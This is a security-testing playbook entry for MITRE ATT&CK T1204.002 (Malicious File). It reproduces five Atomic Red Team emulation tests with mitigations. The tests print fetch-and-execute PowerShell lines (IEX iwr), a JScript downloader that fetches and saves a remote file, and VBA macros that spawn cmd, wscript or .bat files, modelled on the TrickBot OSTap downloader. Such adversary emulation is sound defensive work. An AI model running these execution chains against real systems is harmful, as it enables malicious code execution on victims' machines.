---
name: "T1204.002_malicious-file"
description: "An adversary may rely upon a user opening a malicious file in order to gain execution."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1204.002
  - execution
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1204.002"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1204/002"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-94
chains_with:
  - T1204
  - T1204.001
  - T1204.003
  - T1204.004
  - T1204.005
prerequisites:
  - T1204
severity_boost:
  T1204: "Chain with T1204 for deeper attack path"
  T1204.001: "Chain with T1204.001 for deeper attack path"
  T1204.003: "Chain with T1204.003 for deeper attack path"
---

# T1204.002 Malicious File

> **Sub-technique of:** T1204

## High-Level Description

An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.

Adversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. 

While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Malicious File technique is applicable to target environment
- [ ] Check Linux systems for indicators of Malicious File
- [ ] Check macOS systems for indicators of Malicious File
- [ ] Check Windows systems for indicators of Malicious File
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: OSTap Style Macro Execution

This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
References:
  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed

### Atomic Test 2: OSTap Payload Download

Uses cscript //E:jscript to download a file

**Supported Platforms:** windows

```cmd
echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
```

### Atomic Test 3: Maldoc choice flags command execution

This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed

### Atomic Test 4: OSTAP JS version

Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed

### Atomic Test 5: Office launching .bat file from AppData

Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c #{bat_path} `", vbNormalFocus)`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
```

**Dependencies:**
- Microsoft #{ms_product} must be installed


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Malicious File by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1204.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention
Application control may be able to prevent the running of executables masquerading as other files.

### M1040 Behavior Prevention on Endpoint
On Windows 10, various Attack Surface Reduction (ASR) rules can be enabled to prevent the execution of potentially malicious executable files (such as those that have been downloaded and executed by Office applications/scripting interpreters/email clients or that do not meet specific prevalence, age, or trusted list criteria). Note: cloud-delivered protection must be enabled for certain rules.

### M1017 User Training
Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.


## Detection

### User Execution – Malicious File via download/open → spawn chain (T1204.002)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Malicious File technique applicable | High | Execution |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-94 | Improper Control of Generation of Code |


## References

- [Password Protected Word Docs](https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/)
- [Mandiant Trojanized Windows 10](https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government)
- [Atomic Red Team - T1204.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1204.002)
- [MITRE ATT&CK - T1204.002](https://attack.mitre.org/techniques/T1204/002)
